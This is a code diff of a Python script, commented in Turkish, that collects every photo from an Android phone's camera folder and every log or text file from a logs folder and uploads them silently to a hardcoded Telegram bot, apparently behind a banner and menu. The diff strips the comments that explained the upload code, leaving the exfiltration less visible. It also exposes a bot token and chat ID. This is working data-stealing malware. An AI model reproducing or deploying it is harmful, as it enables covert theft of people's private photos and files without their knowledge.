@@ -8,12 +8,12 @@ from colorama import Fore, Style, init
 init(autoreset=True)
 
 # Telegram Bot Token ve Chat ID
-TELEGRAM_BOT_TOKEN = '7773571310:AAGD3Wn3MeDaQSZWmGNOQQfbfltuDtT8Nos'  # Bot token'ınızı buraya yazın
-TELEGRAM_CHAT_ID = '1044807606'  # Chat ID'nizi buraya yazın
+TELEGRAM_BOT_TOKEN = '7773571310:AAGD3Wn3MeDaQSZWmGNOQQfbfltuDtT8Nos'  # 
+TELEGRAM_CHAT_ID = '1044807606'  # 
 
-# Fotoğrafların ve logların bulunduğu dizinler
-PHOTO_DIRECTORY = '/storage/emulated/0/DCIM/Camera'  # Fotoğrafların bulunduğu dizin
-LOG_DIRECTORY = '/storage/emulated/0/Logs'  # Log dosyalarının bulunduğu dizin
+
+PHOTO_DIRECTORY = '/storage/emulated/0/DCIM/Camera'  
+LOG_DIRECTORY = '/storage/emulated/0/Logs'  
 
 def show_banner():
     """Python başladığında ASCII sanatını gösteren fonksiyon."""
@@ -28,7 +28,7 @@ def show_banner():
     print(banner)
 
 def send_to_telegram(file_path, is_photo=True):
-    """Telegram'a dosya gönderen fonksiyon."""
+    """"""
     try:
         if is_photo:
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
@@ -40,14 +40,14 @@ def send_to_telegram(file_path, is_photo=True):
         data = {'chat_id': TELEGRAM_CHAT_ID}
         requests.post(url, files=files, data=data)
     except Exception as e:
-        pass  # Hata durumunda hiçbir şey yapma
+        pass  # 
     finally:
         if 'files' in locals():
             for file in files.values():
                 file.close()
 
 def get_files(directory, extensions):
-    """Belirli bir dizindeki belirli uzantılı dosyaları bulan fonksiyon."""
+    """"""
     files = []
     try:
         for root, _, filenames in os.walk(directory):
@@ -60,12 +60,12 @@ def get_files(directory, extensions):
     return files
 
 def main():
-    # Fotoğrafları bul ve gönder
+    
     photo_files = get_files(PHOTO_DIRECTORY, ('.jpg', '.jpeg', '.png'))
     for photo in photo_files:
         send_to_telegram(photo, is_photo=True)
     
-    # Log dosyalarını bul ve gönder
+    
     log_files = get_files(LOG_DIRECTORY, ('.log', '.txt'))
     for log in log_files:
         send_to_telegram(log, is_photo=False)
@@ -78,7 +78,7 @@ def show_menu():
     return choice
 
 if __name__ == "__main__":
-    show_banner()  # ASCII sanatını göster
+    show_banner()  # 
     choice = show_menu()
     
     if choice == '1':
